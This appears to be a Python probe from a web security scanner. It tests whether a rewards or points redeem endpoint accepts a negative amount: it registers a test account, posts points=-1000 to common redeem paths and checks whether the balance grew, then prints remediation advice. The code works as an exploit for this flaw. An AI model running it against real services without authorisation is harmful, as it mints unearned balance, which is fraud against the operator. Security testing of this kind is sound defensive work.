#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Business logic: rewards / points endpoint accepts a negative
redemption, increasing the user's balance instead of decreasing it.

Pattern: a redeem endpoint signature looks like
`{ "points": <int> }` and the controller does `balance -= points`
without first asserting `points > 0`. Send `points: -1000` and you
have just printed 1000 points. The same flaw lives in gift-card
"redeem amount", "spend rewards", "withdraw points to credit"
endpoints.

Detection signal:
  Validated=True only when ALL of:
    1. POST .../redeem with a negative amount returns 200/201
       (server didn't reject the input), AND
    2. A subsequent GET of the user's balance shows the balance
       INCREASED by the absolute value of the negative amount (or at
       least went up materially).

Both signals required. We never validate from a 200 alone — many
endpoints return 200 even when refusing the operation.
"""
from __future__ import annotations

import json
import re
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

REDEEM_PATHS = (
    "/api/rewards/redeem",
    "/api/points/redeem",
    "/api/loyalty/redeem",
    "/api/rewards/spend",
    "/rest/rewards/redeem",
    "/api/wallet/redeem",
)
BALANCE_PATHS = (
    "/api/rewards/balance",
    "/api/points/balance",
    "/api/loyalty/me",
    "/api/users/me",
    "/api/wallet",
    "/rest/rewards/balance",
)
DEFAULT_NEGATIVE = -1000


def _register_and_login(client: SafeClient, origin: str) -> dict:
    email = f"points-{secrets.token_hex(6)}@dast.test"
    pw = "Pr0be-" + secrets.token_hex(4)
    out: dict = {"email": email, "password": pw, "token": None}
    body = json.dumps({"email": email, "password": pw,
                       "passwordRepeat": pw,
                       "securityQuestion": {"id": 1},
                       "securityAnswer": "probe"}).encode()
    r = client.request("POST", urljoin(origin, "/api/Users"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["register_status"] = r.status
    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request("POST", urljoin(origin, "/rest/user/login"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            auth = doc.get("authentication") or {}
            out["token"] = auth.get("token")
        except json.JSONDecodeError:
            pass
    return out


def _read_balance(client: SafeClient, origin: str,
                  token: str) -> tuple[str, float | None]:
    for path in BALANCE_PATHS:
        r = client.request("GET", urljoin(origin, path),
                           headers={"Authorization": f"Bearer {token}"})
        if r.status != 200 or not r.body:
            continue
        try:
            doc = json.loads(r.text)
        except json.JSONDecodeError:
            continue
        for src in (doc, doc.get("data") if isinstance(doc, dict) else None):
            if not isinstance(src, dict):
                continue
            for key in ("points", "balance", "rewardBalance",
                        "rewardsBalance", "loyaltyPoints", "credit"):
                v = src.get(key)
                if isinstance(v, (int, float)):
                    return path, float(v)
    return "", None


class BizLogicPointsNegativeRedeemProbe(Probe):
    name = "bizlogic_points_negative_redeem"
    summary = ("Detects rewards/points redeem endpoint that accepts "
               "negative amounts, granting balance instead of "
               "deducting it.")
    safety_class = "probe"

    def add_args(self, parser):
        parser.add_argument(
            "--negative-amount", type=int, default=DEFAULT_NEGATIVE,
            help=("Negative integer to send as the points/amount "
                  "value (default -1000)."))

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        amount = int(args.negative_amount)
        if amount >= 0:
            # Hard-stop: a non-negative amount cannot demonstrate
            # this bug. Refuse to run rather than producing noise.
            return Verdict(
                ok=False, error=("--negative-amount must be < 0 for "
                                 "this probe to be meaningful"))

        sess = _register_and_login(client, origin)
        if not sess.get("token"):
            return Verdict(
                validated=False, confidence=0.6,
                summary=(f"Inconclusive: no probe session on {origin}."),
                evidence={"origin": origin,
                          "session": {k: v for k, v in sess.items()
                                      if k != "password"}},
            )
        token = sess["token"]

        balance_path, balance_before = _read_balance(client, origin, token)
        # If the rewards subsystem isn't visible from outside the
        # signed-up shape, we can't measure the delta — refuted.
        if balance_before is None:
            return Verdict(
                validated=False, confidence=0.85,
                summary=(f"Refuted: no rewards/points balance "
                         f"endpoint readable on {origin}."),
                evidence={"origin": origin,
                          "tried": list(BALANCE_PATHS)},
            )

        # Try the negative redeem against each candidate endpoint;
        # stop at the first non-404 response.
        target = ""
        last_status = 0
        last_body = ""
        # We send several common field-name shapes so the endpoint's
        # bind layer takes the value regardless of its naming.
        payload = json.dumps({"points": amount, "amount": amount,
                              "value": amount, "quantity": amount}).encode()
        for path in REDEEM_PATHS:
            r = client.request("POST", urljoin(origin, path), headers={
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json"}, body=payload)
            if r.status == 404:
                continue
            target = path
            last_status = r.status
            last_body = (r.text or "")[:160]
            break
        if not target:
            return Verdict(
                validated=False, confidence=0.85,
                summary=(f"Refuted: no rewards-redeem endpoint on "
                         f"{origin} (all candidates 404)."),
                evidence={"origin": origin,
                          "tried": list(REDEEM_PATHS),
                          "balance_before": balance_before},
            )

        _, balance_after = _read_balance(client, origin, token)

        attempt = {"endpoint": target, "amount": amount,
                   "redeem_status": last_status,
                   "redeem_body_excerpt": last_body,
                   "balance_path": balance_path,
                   "balance_before": balance_before,
                   "balance_after": balance_after}
        evidence = {"origin": origin, "attempt": attempt,
                    "session_email": sess.get("email")}

        accepted = 200 <= last_status < 300
        balance_grew = (
            isinstance(balance_after, float)
            and balance_after > balance_before + 0.001
        )
        if accepted and balance_grew:
            return Verdict(
                validated=True, confidence=0.94,
                summary=(f"Confirmed: rewards endpoint "
                         f"{origin}{target} accepted points={amount} "
                         f"and balance grew from {balance_before} to "
                         f"{balance_after}."),
                evidence=evidence,
                severity_uplift="high",
                remediation=(
                    "Validate the redeem amount as a positive integer "
                    "at the controller level: `assert points > 0`. "
                    "Reinforce with a database CHECK constraint and a "
                    "ledger model that stores positive debits and "
                    "credits as separate rows so a buggy controller "
                    "can't synthesize a credit by sending negative "
                    "input."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: negative redeem on {origin}{target} "
                     f"either rejected (status {last_status}) or did "
                     f"not increase balance "
                     f"({balance_before} -> {balance_after})."),
            evidence=evidence,
        )


if __name__ == "__main__":
    BizLogicPointsNegativeRedeemProbe().main()
